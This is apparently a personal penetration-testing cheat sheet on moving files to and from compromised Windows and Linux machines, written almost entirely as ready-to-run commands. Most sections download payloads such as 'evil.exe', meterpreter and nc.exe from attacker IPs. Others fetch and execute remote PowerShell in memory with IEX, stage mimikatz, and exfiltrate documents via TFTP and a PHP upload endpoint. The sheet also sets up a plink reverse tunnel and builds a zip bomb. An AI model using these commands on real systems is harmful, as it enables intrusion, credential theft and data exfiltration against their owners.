# Built in windows utility to download file:
## certutil.exe

```
certutil.exe -urlcache -split -f http://10.10.0.101/evil.exe safe.exe
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
```

## Powershell:
```
(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")	
wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"	
```


# Download a file using the Windows Defender CLI Tool
```
C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\<version-number>\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
```
C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe


# Plink.exe
```
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.110
```
### Usage
```Usage: plink [options] [user@]host [command]                                                                                                                                                                                               
       ("host" can also be a PuTTY saved session name)                                                                                                                                                                                     
Options:                                                                                                                                                                                                                                   
  -V        print version information and exit                                                                                                                                                                                             
  -pgpfp    print PGP key fingerprints and exit                                                                                                                                                                                            
  -v        show verbose messages                                                                                                                                                                                                          
  -load sessname  Load settings from saved session                                                                                                                                                                                         
  -ssh -telnet -rlogin -raw -serial                                                                                                                                                                                                        
            force use of a particular protocol                                                                                                                                                                                             
  -P port   connect to specified port                                                                                                                                                                                                      
  -l user   connect with specified username                                                                                                                                                                                                
  -batch    disable all interactive prompts                                                                                                                                                                                                
  -proxycmd command                                                                                                                                                                                                                        
            use 'command' as local proxy                                                                                                                                                                                                   
  -sercfg configuration-string (e.g. 19200,8,n,1,X)                                                                                                                                                                                        
            Specify the serial configuration (serial only)                                                                                                                                                                                 
The following options only apply to SSH connections:                                                                                                                                                                                       
  -pw passw login with specified password                                                                                                                                                                                                  
  -D [listen-IP:]listen-port                                                                                                                                                                                                               
            Dynamic SOCKS-based port forwarding                                                                                                                                                                                            
  -L [listen-IP:]listen-port:host:port                                                                                                                                                                                                     
            Forward local port to remote address                                                                                                                                                                                           
  -R [listen-IP:]listen-port:host:port                                                                                                                                                                                                     
            Forward remote port to local address                                                                                                                                                                                           
  -X -x     enable / disable X11 forwarding                                                                                                                                                                                                
  -A -a     enable / disable agent forwarding                                                                                                                                                                                              
  -t -T     enable / disable pty allocation
  -1 -2     force use of particular protocol version
  -4 -6     force use of IPv4 or IPv6
  -C        enable compression
  -i key    private key file for user authentication
  -noagent  disable use of Pageant
  -agent    enable use of Pageant
  -noshare  disable use of connection sharing
  -share    enable use of connection sharing
  -hostkey aa:bb:cc:...
            manually specify a host key (may be repeated)
  -sanitise-stderr, -sanitise-stdout, -no-sanitise-stderr, -no-sanitise-stdout
            do/don't strip control chars from standard output/error
  -no-antispoof   omit anti-spoofing prompt after authentication
  -m file   read remote command(s) from file
  -s        remote command is an SSH subsystem (SSH-2 only)
  -N        don't start a shell/command (SSH-2 only)
  -nc host:port
            open tunnel in place of session (SSH-2 only)
  -sshlog file
  -sshrawlog file
            log protocol details to a file
  -shareexists
            test whether a connection-sharing upstream exists
```


# Start a Webserver with Python:
Whatever folder you start this in will be the folder listed and available online. 
so if you run this from the home folder, then you'd open a browser and go to the IP/PORT and see everything in the home folder.
-m is for module
## Python 2
``` 
python -m SimpleHTTPServer 8080
```
## Python 3
```
python3 -m http.server 8000
```
## Check:
browse to localhost:8000
## From Victim Machine:
browse to \<Attacker-IP\>:8000

# 'my_server.py':
```
#!/usr/bin/env python
from pyftpdlib import servers
from pyftpdlib.handlers import FTPHandler
address = ("0.0.0.0", 21)  # listen on every IP on my machine on port 21
server = servers.FTPServer(address, FTPHandler)
server.serve_forever()
```

# Run a ruby webrick basic http server
```
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
```

# Run a basic PHP http serve
```
php -S 0.0.0.0:80					r
```

# SMB share:
## setup SMB sharefrom Impacket:
/opt/impacket/examples:
```
python smbserver.py ROPNOP /root/shells
```

## From Windows:
```
net view \\192.168.1.29
dir \\192.168.1.29\folder
copy \\192.168.1.29\folder\mailicious.exe
```

### OR:
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```

# Setup FTP server:
## install and start FTP server:
```
apt-get install python-pyftpdlib
python -m pyftpdlib -p 21
```
## create anonymous ftp with write access to your filesystem.
```
python -m pyftpdlib
python -m pyftpdlib --help
python3 -m pyftpdlib.ftpserver
```

## Download file from Windows:
```
C:\>ftp 192.168.1.29
username: anonymous
password: whatever
ftp> binary
ftp> get malicious.exe
ftp> bye
```

# NetCat File Transfer:
nc is basically a built-in tool from any UNIX-like systems (even embedded systems), so it's perfect for "quick and temporary way to transfer files".
open a listen on port 12345, waiting for data.
## Step 1, on the receiver side, run:
```
nc -l 12345 | tar -xf -
```

## Step 2, on the sender side:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ... | nc $RECEIVER_IP 12345
```
### Alternate Step 2
#### You can also put pv in the middle to monitor the progress of transferring:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ...| pv | nc $RECEIVER_IP 12345
```
After the transferring is finished, both sides of nc will quit automatically, and job done.

# systemctl
using "systemctl enable" instead if "service * start" means the service will automatically start after reboot. 

### Examples:
```
systemctl enable postgresql
systemctl enable ssh 
systemctl disable ssh
```
# Zip Bomb:
```
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```
# Bitsadmin

The /transfer in bitsadmin is one of the simplest ways to download the file from the attacker machine

```
bitsadmin /transfer job https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe C:\Temp\putty.exe
```

# TFTP File Transfer

Works by default on:

Windows XP

Windows 2003

Kali has a TFTP server build in.
You can server up some files with it like this

```
atftpd --daemon --port 69 /tftp
/etc/init.d/atftpd restart
```
Now you can put stuff in /srv/tftp and it will be served. 

So now you can upload and download whatever from the windows-machine like this

```
tftp -i 192.160.1.101 GET wget.exe
```
## TFTP File Upload

```
kali@kali:~$ sudo apt update && sudo apt install atftp kali@kali:~$ sudo mkdir /tftp
kali@kali:~$ sudo chown nobody: /tftp
kali@kali:~$ sudo atftpd --daemon --port 69 /tftp
```

```
 C:\Users\Offsec> tftp -i 10.11.0.4 put important.docx
```

# FTP File Transfer

Install pure-ftpd

```
kali@kali:~$ sudo apt update && sudo apt install pure-ftpd
```

Setup script

```
kali@kali:~$ cat ./setup-ftp.sh #!/bin/bash
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser sudo pure-pw useradd offsec -u ftpuser -d /ftphome sudo pure-pw mkdb
sudo cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
sudo mkdir -p /ftphome
sudo chown -R ftpuser:ftpgroup /ftphome/
sudo systemctl restart pure-ftpd
```
We will make the script executable, then run it and enter “lab” as the password for the offsec user when prompted:

```
kali@kali:~$ chmod +x setup-ftp.sh kali@kali:~$ sudo ./setup-ftp.sh Password:
Enter it again:
Restarting ftp server
```

Upgrade non-interactive shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
C:\Users\offsec> ftp -h
```

```
 kali@kali:~$ sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/ 
 kali@kali:~$ ls /ftphome/
nc.exe

 kali@kali:~$ sudo systemctl restart pure-ftpd
```

Create script

```
echo open 10.11.0.4 21> ftp.txt 
echo USER offsec>> ftp.txt 
echo lab>> ftp.txt 
echo bin >> ftp.txt 
echo GET nc.exe >> ftp.txt 
echo bye >> ftp.txt

```
Copy mimikatz files

```
echo open 192.168.119.175 21> ftp.txt
echo USER offsec>> ftp.txt
echo lab>> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo GET mimilib.dll >> ftp.txt
echo GET mimidrv.sys >> ftp.txt
echo bye >> ftp.txt
```

Run command

```
ftp -i -v -n -s:ftp.txt
ftp -n -s:ftp.txt - this one worked
```


# Using VBScript

```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs 
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs 
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Run Script

```
C:\Users\Offsec> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
```

# Using Power Shell

On Windows
```
echo $webclient = New-Object System.Net.WebClient >>wget.ps1 
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1 
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Run

```
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```

Powershell one liner

```
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
```

On Kali

```
 kali@kali:/var/www/html$ sudo cat helloworld.ps1 
 Write-Output "Hello World"
```

On Windows

```
C:\Users\Offsec> powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1') 
Hello World
```

# exe2hex

```
kali@kali:~$ locate nc.exe | grep binaries /usr/share/windows-resources/binaries/nc.exe
kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .
kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe

kali@kali:~$ upx -9 nc.exe
Ultimate Packer for eXecutables
Copyright (C) 1996 - 2018
UPX 3.95 Markus Oberhumer, Laszlo Molnar & John Reiser Aug 26th 2018
File size Ratio Format Name -------------------- ------ ----------- -----------
59392 -> 29696 50.00% win32/pe nc.exe Packed 1 file.
kali@kali:~$ ls -lh nc.exe
-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe


kali@kali:~$ exe2hex -x nc.exe -p nc.cmd 
[*] exe2hex v1.5.1
[+] Successfully wrote (PoSh) nc.cmd


```


# File upload to kali using PHP

Upload.php

```
<?php
$uploaddir = '/var/www/uploads/';

$uploadfile = $uploaddir . $_FILES['file']['name'];

move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile) ?>
```

Create upload folder

```
kali@kali:/var/www$ sudo mkdir /var/www/uploads
kali@kali:/var/www$ ps -ef | grep apache
root 1946 1 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start www-data 1947 1946 0 21:39 ? 00:00:00 /usr/sbin/apache2 -k start
kali@kali:/var/www$ sudo chown www-data: /var/www/uploads
kali@kali:/var/www$ ls -la
total 16
drwxr-xr-x 4 root root
drwxr-xr-x 13 root root
drwxr-xr-x 2 root root
drwxr-xr-x 2 www-data www-data 4096 Feb 2 00:33 uploads
```

Upload file
```
 C:\Users\Offsec> powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
```



https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/

